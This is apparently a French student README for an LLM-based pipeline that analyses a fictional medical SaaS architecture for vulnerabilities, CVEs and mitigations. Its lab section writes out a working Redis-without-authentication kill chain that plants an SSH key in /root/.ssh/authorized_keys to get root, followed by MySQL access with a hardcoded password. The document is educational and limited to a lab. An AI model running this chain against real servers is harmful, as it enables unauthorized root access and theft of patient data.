# VulnAI Management

> TP3 EFREI RS3 S8 ARIR83 — Mattéo LAUNAY, Amina EL-ABED, Soulaimane LAARISSI, Ethan GUINGAND et Josselin KEIB

Pipeline d'analyse de sécurité piloté par LLM, développé pour le TP3.

On lui donne la description textuelle d'une architecture, il génère un rapport : vulnérabilités détectées, CVE associées, scénarios d'attaque et recommandations de correction concrètes.

Architecture testée : **MediConnect Corp**, plateforme SaaS médicale fictive.

## Ce que fait le pipeline

1. Lit la description de l'architecture et en extrait les composants (regex + LLM)
2. Interroge le LLM pour identifier les vulnérabilités (Claude, Llama3 ou GPT-4o)
3. Cherche les CVE correspondantes via l'API NVD
4. Génère des scénarios d'attaque calqués sur le framework MITRE ATT&CK
5. Propose des corrections avec les commandes de vérification
6. Exporte le tout en JSON et en HTML

## Organisation du code

```
vuln_ai/
├── main.py                        # point d'entrée
├── parser/arch_parser.py          # extraction des composants (regex + LLM)
├── analyzer/llm_analyzer.py       # détection des vulnérabilités
├── mapper/cve_mapper.py           # récupération des CVE via l'API NVD
├── scenarios/attack_gen.py        # génération de scénarios d'attaque
├── mitigations/mitigation_gen.py  # recommandations de correction
└── output/report_builder.py       # export JSON + HTML

data/mediconnect_arch.txt  # description de l'architecture MediConnect
lab/docker-compose.yml     # lab Docker pour le Scénario C (Redis sans auth)
config.yaml                # configuration LLM et NVD
```

## Installation

```bash
pip install -r requirements.txt
cp .env.example .env
# Laisser vide si on veut rester en local avec Ollama
# Renseigner OPENAI_API_KEY ou ANTHROPIC_API_KEY seulement si on veut utiliser une API distante
```

## Utilisation

```bash
# Sans clé API — données de démo pré-remplies, pipeline complet
python -m vuln_ai.main --demo

# Pipeline complet avec LLM
python -m vuln_ai.main

# Sans appels NVD (plus rapide pour tester)
python -m vuln_ai.main --skip-cve

# Sur une autre architecture
python -m vuln_ai.main --arch chemin/vers/mon_archi.txt
```

Les rapports se trouvent dans `output/` :

- `output/report_raw.json` : données brutes
- `output/report_mediconnect.html` : rapport lisible dans un navigateur

Pour vérifier le mapping CVE, lance le pipeline sans `--demo` et regarde :

- Section "CVE Mapping Table" dans `output/report_mediconnect.html`
- Champ `cve_mapping_table` dans `output/report_raw.json`

## Configurer le LLM

Le projet est configuré pour essayer Ollama en local en premier. Si Ollama n'est pas dispo, il bascule automatiquement sur OpenAI ou Anthropic si une clé est présente, sinon il retombe sur les données de démo.

Dans `config.yaml` :

```yaml
llm:
  provider: ollama       # anthropic | ollama | openai
  model: claude-sonnet-4-6
```

Pour tourner en local avec Ollama (aucune donnée ne sort de la machine) :

```yaml
llm:
  provider: ollama
ollama:
  base_url: http://localhost:11434
  model: llama3:70b
```

Dans un contexte médical réel, Ollama est le bon choix. Pour l'architecture fictive MediConnect, les deux fonctionnent.

## Lab — Scénario C : Redis sans authentification

```bash
cd lab/
docker compose up -d
# Redis sur localhost:6379, pas de mot de passe
# Webapp sur http://localhost:8080
```

Kill chain à reproduire en lab isolé :

```bash
redis-cli -h 127.0.0.1
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA...cle_attaquant...\n\n"
BGSAVE
ssh root@127.0.0.1
mysql -u app_user -pApp2023! -h mysql mediconnect
```

Preuve rapide (attendue) :

```bash
# La webapp répond et affiche 3 patients
curl http://localhost:8080

# Vérifier côté MySQL
docker exec -it mediconnect_mysql mysql -u app_user -pApp2023! -e "USE mediconnect; SELECT COUNT(*) FROM patients;"
```

## Avertissement

Ces techniques sont réservées aux labs isolés. Les utiliser sur des systèmes réels sans autorisation écrite est un délit (article 323-1 du Code pénal).
